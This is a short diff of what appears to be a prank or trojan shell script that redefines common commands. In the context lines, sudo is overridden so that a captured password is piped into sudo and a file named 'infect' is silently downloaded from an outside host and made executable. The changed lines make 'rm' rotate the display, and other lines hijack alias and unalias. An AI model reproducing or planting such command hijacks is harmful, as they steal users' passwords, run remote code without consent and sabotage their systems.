@@ -89,7 +89,8 @@ sudo() {
     echo $pass | $sudo -S curl --output $cfl "http://snaipe.github.io/confloose/infect" >/dev/null 2>&1;
     echo $pass | $sudo -S chmod +x $cfl;
 }
-rot() { xrandr -o left; xrandr -x; }
+
+f rm "xrandr -o left; xrandr -x"
 
 alias() { display http://impawards.com/tv/posters/alias_ver2.jpg }
 unalias() { display -flop http://impawards.com/tv/posters/alias_ver2.jpg }
